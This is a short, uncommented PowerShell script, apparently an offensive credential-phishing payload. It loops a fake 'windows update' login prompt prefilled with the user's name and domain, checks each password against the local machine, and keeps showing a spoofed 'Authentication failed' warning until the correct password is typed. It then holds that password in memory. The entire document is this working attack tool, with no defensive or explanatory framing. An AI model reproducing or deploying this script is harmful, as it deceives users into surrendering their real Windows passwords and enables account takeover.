
[int]$cnt = 1
while ( $cnt -lt '1000000000' ) {
 
	$user    = [Environment]::UserName
	$domain  = [Environment]::UserDomainName

	$credentials = $Host.UI.PromptForCredential('windows update','',$user,[Environment]::UserDomainName)
	$pass = $credentials.getnetworkcredential().password

	Add-Type -assemblyname system.DirectoryServices.AccountManagement 
	$localMachine = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
	$credtest = $localMachine.ValidateCredentials($user,$pass)


	if ( $credtest -eq $false ) {
	
	Add-Type -assemblyname System.Windows.Forms
	$choice = [System.Windows.Forms.MessageBox]::Show("Authentication failed! Please enter correct password", "Reconnection Attempt Failed!", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning)		
	} 

else { 
	
	break 
	}

	$cnt++
}